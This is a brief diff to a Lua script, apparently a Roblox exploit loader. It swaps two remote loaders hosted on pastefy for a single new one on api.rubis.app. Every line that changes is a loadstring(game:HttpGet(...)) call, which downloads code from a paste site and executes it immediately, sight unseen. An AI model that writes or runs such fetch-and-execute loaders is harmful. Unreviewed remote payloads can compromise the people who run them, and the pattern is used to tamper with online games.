@@ -1,7 +1,1 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.pastefy.lol/files/v4/loaders/8d3f5e51b1c643ffbc6e037ba4d6250e.lua"))() 
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/Tz52r5HW/raw"))()
-end)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/wG61BxVZ1jVLlWik/raw"))()
